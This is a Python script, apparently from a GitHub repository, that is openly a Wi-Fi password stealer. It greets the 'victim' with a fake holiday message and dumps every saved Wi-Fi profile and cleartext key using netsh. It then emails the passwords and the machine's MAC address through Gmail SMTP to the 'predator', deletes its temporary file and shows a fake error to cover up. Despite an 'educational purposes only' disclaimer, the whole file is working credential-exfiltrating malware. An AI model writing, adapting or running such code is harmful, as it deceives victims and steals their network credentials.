#! py
#########################
# Copyright of astranot #
# github.com/astranot   #
# fikrichuck@gmail.com  #
# twitter/fiekzzlala    #
#########################

# import libraries
from email.mime.base import MIMEBase
import subprocess
import smtplib
import numpy as np
from email.mime.text import MIMEText
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
import os
import getmac
# This python script is solely for educational purposes only
# Everything is under the user's responsibility
# Written at 17/11/2021
# Script:
# create a list of wifi names and passwords
# email the list to the predator / user

# bait to the victim
print("Happy holidays guys! Wish you all the best!\n")
print("Please wait this might take a while")

# list of wifi names and password
dictionary = [] # password bank
kamus = [] # list of wifi and password

# run the command netsh wlan show profiles and decode the results in utf-8 decoder
bytesData = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], stdout=subprocess.PIPE)

# put the decoded data in the data variable
data = "".join(map(chr, bytesData.stdout)).split('\n')

# put every profiles saved from the pc to a profiles list
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]

for i in profiles:
    # run the command to gain the password from the pc to the results
    bytesResults = subprocess.run(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'], stdout=subprocess.PIPE)

    # store the decoded data in the results
    results = "".join(map(chr, bytesResults.stdout)).split('\n')

    for a in results:

        # if the "Key Content" is displayed, thus there may be a password
        if "Key Content" in a:

            # if the content password is null then passwd is null
            # passwd will be assigned to null
            if a.split(":")[1][1:-1] == None:
                passwd = ""
            else:
                # assign the password to the passwd
                passwd = a.split(":")[1][1:-1]

        # if the "Key Index" is displayed, thus there will be no password
        # "Key Index" mostly for the enterprise wifi
        # passwd will be assigned to null
        elif "Key Index" in a:
            passwd = ""

    # copy the wifi name and password to the dictionary
    kamus.append(i)
    kamus.append(passwd)
    dictionary.append(passwd)

# determine the length of the dictionary to change the list to 2D list
# change the shape of the list from 1D to 2D list
length = int(len(kamus) / 2)
string = np.array(kamus).reshape(length, 2)

ping = '\n'.join(str(item) for innerlist in string for item in innerlist)

#print(ping)
#print(type(ping))

def listToString(s): 
    
    # initialize an empty string
    str1 = "\n" 
    
    # return string  
    return (str1.join(s))
        
m = listToString(dictionary)
#print(m)
# assign the list to string in wifi

wifi = str(kamus)
#print(wifi)

# the function will send the wifi string to the predator / user
def email_alert(fromMac, body, to):

    # assign MIMEMultipart() function to msg
    msg = MIMEMultipart()
    # assign the string to the body of email
    msg.attach(MIMEText(body, 'plain'))
    # assign title or subject to the subject of the email

    subject = 'Password wifi from ' + fromMac

    msg['subject'] = subject
    # determine the receiver of the email
    msg['to'] = to
    # Create a user
    # Put your gmail account and password
    user = "sender@gmail.com"
    # assign the sender to the user
    msg['from'] = user
    # Put your password in the password section
    # **NOTE**
    # This is not your regular gmail password
    # To gain the password you must activate the 2 factor authentication
    # Activate the 'Other' in the app password
    # Gain the generated password in the section
    password = "user_password"


    # assign wifi dictionary to filename
    filename = 'ding.txt'
    # open the filename and read-byte
    attachment = open(filename, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    # encode the file to base64
    encoders.encode_base64(part)
    # add header file to the part
    part.add_header('Content-Disposition', "attachment; filename= " + filename)
    # attach the file to the msg
    msg.attach(part)
    # assign text as string
    text = msg.as_string()
    

    # create smtp server
    server = smtplib.SMTP("smtp.gmail.com", 587)
    # connect securely to server
    server.starttls()
    # login using assigned user and password
    server.login(user, password)
    # send email
    #server.send_message(msg)
    server.sendmail(user, to, text)
    # quit the email server
    server.quit()

# create dictionary as .txt file
def wifiTxt(wifi):
    
    # create text file
    textFile = open("ding.txt", "w")

    # write the wifi dictionary into the file
    n = textFile.write(wifi)

    # close file
    textFile.close()

mac = getmac.get_mac_address()
    

# function call
wifiTxt(m)
email_alert(mac, wifi, "receiver@gmail.com")

# remove the ding.txt from the victim
if os.path.exists('ding.txt'):
    os.remove('ding.txt')

# clear screen and exit the program
os.system('cls')
print("Something went wrong :(")
input("Press any key to continue")
